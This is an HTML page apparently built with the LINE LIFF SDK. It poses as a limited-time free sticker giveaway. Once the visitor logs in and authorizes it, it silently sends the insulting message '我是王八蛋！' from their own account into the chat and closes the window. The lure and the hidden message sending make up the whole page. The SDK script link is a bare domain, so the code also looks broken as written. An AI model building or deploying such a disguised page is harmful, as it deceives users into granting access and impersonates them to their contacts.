<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>限時貼圖免費領取</title>
    <!-- 引入 LINE 官方的 LIFF SDK（已修正網址） -->
    <script src="https://line-scdn.net"></script>
</head>
<body>
    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
        <h2>正在載入 LINE 貼圖，請稍候...</h2>
    </div>

    <script>
        // 確保這裡的 ID 完全對應你在 LINE 點開的那個連結結尾！
        liff.init({ liffId: "2012018749-Jns1tBED" }).then(() => {
            if (liff.isLoggedIn()) {
                // 當使用者同意授權，自動幫他發送這段訊息
                liff.sendMessages([{
                    type: 'text',
                    text: '我是王八蛋！' 
                }]).then(() => {
                    liff.closeWindow(); // 傳送成功後自動關閉 LINE 內建瀏覽器視窗
                }).catch((err) => {
                    alert("發送失敗，請確認聊天室發言權限。原因：" + JSON.stringify(err));
                });
            } else {
                liff.login(); // 沒授權過就引導登入
            }
        }).catch((err) => {
            alert("LIFF 初始化失敗，請檢查後台權限設定。原因：" + JSON.stringify(err));
        });
    </script>
</body>
</html>
